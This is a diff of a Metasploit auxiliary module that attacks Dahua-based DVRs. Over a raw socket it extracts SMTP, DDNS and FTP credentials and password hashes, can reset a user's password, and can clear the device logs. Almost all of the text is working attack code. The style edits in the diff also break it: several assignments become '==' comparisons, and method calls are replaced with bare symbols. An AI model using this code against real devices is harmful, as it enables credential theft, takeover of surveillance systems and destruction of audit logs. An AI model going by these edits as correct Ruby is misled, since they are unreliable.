@@ -63,14 +63,14 @@ class Metasploit3 < Msf::Auxiliary
                 user8pwhash = "4WzwxXxM" #888888
                 user6pwhash = "sh15yfFM" #666666
                 useradminpwhash = "6QNMIQGe" #admin
-                connect()
+                connect
                 sock.put(u1)
                 data = sock.recv(8)
-                disconnect()
+                disconnect
                 if data == dvr_resp
                         print_good("DVR FOUND: @ #{rhost}:#{rport}!")
                         report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => "Dahua-based DVR")
-                        connect()
+                        connect
                         sock.put(version)
                         data = sock.get(1024)
                         if data =~ /[\x00]{8,}([[:print:]]+)/
@@ -86,23 +86,23 @@ class Metasploit3 < Msf::Auxiliary
                         end
 
                         sock.put(email)
-                        if data = sock.get(1024).split('&&')
+                        if data == sock.get(1024).split('&&')
                                 print_status("Email Settings: @ #{rhost}:#{rport}!")
                                 if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
-                                        if mailhost = $1.split(':')
-                                                print_status("	Server: #{mailhost[0]}")  if !mailhost[0].nil?
-                                                print_status("	Destination Email: #{data[1]}")  if !mailhost[1].nil?
+                                        if mailhost == $1.split(':')
+                                                print_status("	Server: #{mailhost[0]}")  unless mailhost[0].nil?
+                                                print_status("	Destination Email: #{data[1]}")  unless mailhost[1].nil?
                                         end
-                                        if !data[5].nil? and !data[6].nil?
-                                                print_good("	SMTP User: #{data[5]}") if !data[5].nil?
-                                                print_good("	SMTP Password: #{data[6]}") if !data[6].nil?
+                                        if !data[5].nil? && !data[6].nil?
+                                                print_good("	SMTP User: #{data[5]}") unless data[5].nil?
+                                                print_good("	SMTP Password: #{data[6]}") unless data[6].nil?
                                                 muser = "#{data[5]}"
                                                 mpass = "#{data[6]}"
                                                 mailserver = "#{mailhost[0]}"
                                                 print_good("MailServer: #{mailserver}")
                                                 #destemail = "#{data[1]}" if !mailhost[1].nil?
-                                                if !mailserver.to_s.strip.length == 0 and !muser.to_s.strip.length == 0 and !mpass.to_s.strip.length == 0
-                                                   report_email_creds(mailserver, rport, muser, mpass) if ( !mailserver.nil? and !muser.nil? and !mpass.nil? )
+                                                if !mailserver.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
+                                                   report_email_creds(mailserver, rport, muser, mpass) if !mailserver.nil? && !muser.nil? && !mpass.nil?
                                                 end
                                         end
                                 end
@@ -122,13 +122,13 @@ class Metasploit3 < Msf::Auxiliary
                                                 ddns_user = "#{val[4]}"
                                                 ddns_pass = "#{val[5]}"
                                                 print_status("DDNS Settings @ #{rhost}:#{rport}!:")
-                                                print_status("	DDNS Service: #{ddns_service}") if !val.nil?
-                                                print_status("	DDNS Server:  #{ddns_server}") if !val.nil?
-                                                print_status("	DDNS Port: #{ddns_port}") if !val.nil?
-                                                print_status("	Domain: #{ddns_domain}") if !val.nil?
-                                                print_good("	Username: #{ddns_user}") if !val.nil?
-                                                print_good("	Password: #{ddns_pass}") if !val.nil?
-                                                if !ddns_server.to_s.strip.length == 0 and !ddns_port.to_s.strip.length == 0 and !ddns_user.to_s.strip.length == 0 and !ddns_pass.to_s.strip.length == 0
+                                                print_status("	DDNS Service: #{ddns_service}") unless val.nil?
+                                                print_status("	DDNS Server:  #{ddns_server}") unless val.nil?
+                                                print_status("	DDNS Port: #{ddns_port}") unless val.nil?
+                                                print_status("	Domain: #{ddns_domain}") unless val.nil?
+                                                print_good("	Username: #{ddns_user}") unless val.nil?
+                                                print_good("	Password: #{ddns_pass}") unless val.nil?
+                                                if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
 
                                                   report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
                                                 end
@@ -137,7 +137,7 @@ class Metasploit3 < Msf::Auxiliary
                         end
 
                         sock.put(nas)
-                        if data = sock.get(1024)
+                        if data == sock.get(1024)
                                 print_status("Nas Settings @ #{rhost}:#{rport}!:")
                                 server = ''
                                 port = ''
@@ -152,26 +152,26 @@ class Metasploit3 < Msf::Auxiliary
                                         ftppass = $2
                                         print_good("	FTP User: #{ftpuser}")
                                         print_good("	FTP Password: #{ftppass}")
-                                        if !ftpuser..to_s.strip.length == 0 and ftppass.to_s.strip.length == 0
-                                           report_creds(:host => server, :port => port, :user => ftpuser, :pass => ftppass, :type => "FTP",
-                                                        :active => true) if ( !server.nil? and !port.nil? and !ftpuser.nil? and !ftppass.nil? )
+                                        if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
+                                           report_creds(host: server, port: port, user: ftpuser, pass: ftppass, type: "FTP",
+                                                        active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
                                         end
                                 end
                         end
 
                         sock.put(channels)
                         data = sock.get(1024).split('&&')
-                        disconnect()
-                        if (data.length > 1)
+                        disconnect
+                        if data.length > 1
                                 print_status("Camera Channels @ #{rhost}:#{rport}!:")
                                 data.each_with_index {
                                         |val, index|
                                         print_status("	#{index+1}:#{val[/([[:print:]]+)/]}")
                                 }
                         end
-                        connect()
+                        connect
                         sock.put(users)
-                        if data = sock.get(1024).split('&&')
+                        if data == sock.get(1024).split('&&')
                              print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
                                  data.each {
                                         |val|
@@ -187,32 +187,31 @@ class Metasploit3 < Msf::Auxiliary
                                         # Write the vulnerability to the database
                                         #unless reported_vuln
                                         report_vuln(
-                                            :host  => rhost,
-                                            :port  => rport,
-                                            :proto => 'tcp',
-                                            :sname => 'dvr',
-                                            :name  => 'Dahua Authentication Password Hash Exposure',
-                                            :info  => "Obtained password hash for user #{username}: #{md5hash}",
-                                            :refs  => self.references
+                                            host: rhost,
+                                            port: rport,
+                                            proto: 'tcp',
+                                            sname: 'dvr',
+                                            name: 'Dahua Authentication Password Hash Exposure',
+                                            info: "Obtained password hash for user #{username}: #{md5hash}",
+                                            refs: :references
                                         )
                                  }
                         end
                         sock.put(groups)
-                        if data = sock.get(1024).split('&&')
+                        if data == sock.get(1024).split('&&')
                                 print_status("User Groups: @ #{rhost}:#{rport}!")
                                    data.each {
                                         |val|
                                         print_status("	#{val[/(([\d]+)[:]([\w]+))/]}")
                                    }
                         end
-                          if (datastore['RESET'])
-                             userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] +
-                                          ":" +  datastore['PASSWORD']
-                             u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" +
+                          if datastore['RESET']
+                             userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] + ":" + datastore['PASSWORD']
+                             u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
                                   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                             u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
+                             u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
                                   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                             u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" +
+                             u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
                                   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                                   userstring
                                 sock.put(u1)
@@ -222,7 +221,7 @@ class Metasploit3 < Msf::Auxiliary
                                 sock.put(u3)
                                 data = sock.get(1024)
                                 sock.put(u1)
-                                if data = sock.get(1024)
+                                if data == sock.get(1024)
                                    print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
                                 end
 # 			elsif (datastore['ACTION'] == "DELETE")
@@ -297,89 +296,88 @@ class Metasploit3 < Msf::Auxiliary
 # 			else
                         end
 
-                        if (datastore['CLEAR_LOGS'])
+                        if datastore['CLEAR_LOGS']
                                 sock.put(clear_logs)
                                 sock.put(clear_logs2)
                                 print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
                         end
-                        disconnect()
+                        disconnect
                end
         end
 
-        def report_hash(ip, rport, user, hash)
-            service_data = {
+       def report_hash(ip, rport, user, hash)
+         service_data = {
                 address: ip,
                 port: rport,
                 service_name: 'dahua_dvr',
                 protocol: 'tcp',
                 workspace_id: myworkspace_id
-              }
+         }
 
-            credential_data = {
-                module_fullname: self.fullname,
+         credential_data = {
+                module_fullname: :fullname,
                 origin_type: :service,
                 private_data: hash,
                 private_type: :nonreplayable_hash,
                 jtr_format: 'dahua_hash',
-                username: user,
-             }.merge(service_data)
+                username: user
+         }.merge(service_data)
 
-            login_data = {
+         login_data = {
                core: create_credential(credential_data),
                status: Metasploit::Model::Login::Status::UNTRIED
-            }.merge(service_data)
+         }.merge(service_data)
 
          create_credential_login(login_data)
        end
 
        def report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
-            service_data = {
+         service_data = {
                 address: ddns_server,
                 port: ddns_port,
                 service_name: 'ddns settings',
                 protocol: 'tcp',
                 workspace_id: myworkspace_id
-              }
+         }
 
-            credential_data = {
-                module_fullname: self.fullname,
+         credential_data = {
+                module_fullname: :fullname,
                 origin_type: :service,
                 private_data: ddns_pass,
                 private_type: :password,
-                username: ddn_user,
-             }.merge(service_data)
+                username: ddns_user
+         }.merge(service_data)
 
-            login_data = {
+         login_data = {
                  core: create_credential(credential_data),
                  status: Metasploit::Model::Login::Status::UNTRIED
-             }.merge(service_data)
+         }.merge(service_data)
 
         create_credential_login(login_data)
       end
 
        def report_email_cred(mailserver, rport, muser, mpass)
-            service_data = {
+         service_data = {
                 address: mailserver,
                 port: rport,
                 service_name: 'email settings',
                 protocol: 'tcp',
                 workspace_id: myworkspace_id
-              }
+         }
 
-            credential_data = {
-                module_fullname: self.fullname,
+         credential_data = {
+                module_fullname: :fullname,
                 origin_type: :service,
                 private_data: mpass,
                 private_type: :password,
-                username: muser,
-             }.merge(service_data)
+                username: muser
+         }.merge(service_data)
 
-            login_data = {
+         login_data = {
                  core: create_credential(credential_data),
                  status: Metasploit::Model::Login::Status::UNTRIED
-             }.merge(service_data)
+         }.merge(service_data)
 
         create_credential_login(login_data)
-      end
-
+       end
 end
